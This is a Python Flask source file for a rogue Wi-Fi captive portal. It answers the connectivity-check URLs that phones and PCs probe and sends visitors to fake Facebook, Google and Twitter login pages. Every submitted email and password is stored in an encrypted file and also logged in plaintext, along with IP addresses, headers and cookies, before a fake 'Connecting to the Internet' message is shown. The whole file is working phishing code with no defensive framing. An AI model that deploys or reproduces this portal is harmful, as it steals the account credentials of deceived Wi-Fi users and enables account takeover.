import os
import json
from flask import Flask, request, render_template, redirect
from cryptography.fernet import Fernet
from datetime import datetime
import time

app = Flask(__name__)

# Load config
with open(os.path.join(os.path.dirname(__file__), '..', 'config.json')) as f:
    config = json.load(f)

fernet = Fernet(config['fernet_key'].encode())

login_dir = os.path.join(os.path.dirname(__file__), '..', 'login_details')
os.makedirs(login_dir, exist_ok=True)
CRED_FILE = os.path.join(login_dir, 'captured_credentials.enc')
LOG_FILE = os.path.join(login_dir, 'activity.log')

def log_activity(message):
    timestamp = datetime.now().isoformat()
    log_line = f"[{timestamp}] {message}"
    print(log_line)
    with open(LOG_FILE, 'a') as f:
        f.write(log_line + "\n")

def log_request_details(prefix, request):
    headers = dict(request.headers)
    cookies = request.cookies
    log_activity(f"{prefix} | Headers: {headers} | Cookies: {cookies}")

@app.route('/', methods=['GET'])
def index():
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    log_activity(f"Landing page visit from {client_ip} | User-Agent: {user_agent}")
    log_request_details("Landing page request details", request)
    time.sleep(2)
    return render_template('select_provider.html')

@app.route('/login/<provider>', methods=['GET'])
def login_provider(provider):
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    log_activity(f"{provider.capitalize()} login page visit from {client_ip} | User-Agent: {user_agent}")
    log_request_details(f"{provider.capitalize()} login page request details", request)
    time.sleep(2)
    template_map = {
        'facebook': 'login_facebook.html',
        'google': 'login_google.html',
        'twitter': 'login_twitter.html'
    }
    template = template_map.get(provider.lower())
    if not template:
        return "Invalid provider", 404
    return render_template(template)

@app.route('/submit/<provider>', methods=['POST'])
def submit_provider(provider):
    log_request_details(f"{provider.capitalize()} credential submission request details", request)
    username = request.form.get('email')
    password = request.form.get('pass')
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.now().isoformat()

    data = {
        'timestamp': timestamp,
        'provider': provider,
        'client_ip': client_ip,
        'username': username,
        'password': password,
        'user_agent': user_agent
    }

    try:
        encrypted = fernet.encrypt(json.dumps(data).encode())
        with open(CRED_FILE, 'ab') as f:
            f.write(encrypted + b'\n')
        log_activity(f"Captured {provider} credentials from {client_ip} | User-Agent: {user_agent} | Username: {username} | Password: {password}")
    except Exception as e:
        log_activity(f"Error saving credentials: {e}")

    return "<h3>Thank you. Connecting to the Internet...</h3>"

# Captive portal detection URLs - redirect to landing page
@app.route('/generate_204')
@app.route('/gen_204')
@app.route('/connecttest.txt')
@app.route('/ncsi.txt')
@app.route('/hotspot-detect.html')
@app.route('/library/test/success.html')
@app.route('/success.txt')
def captive_portal_redirect():
    return '<html><head><meta http-equiv="refresh" content="0; url=/" /></head><body>Redirecting...</body></html>', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
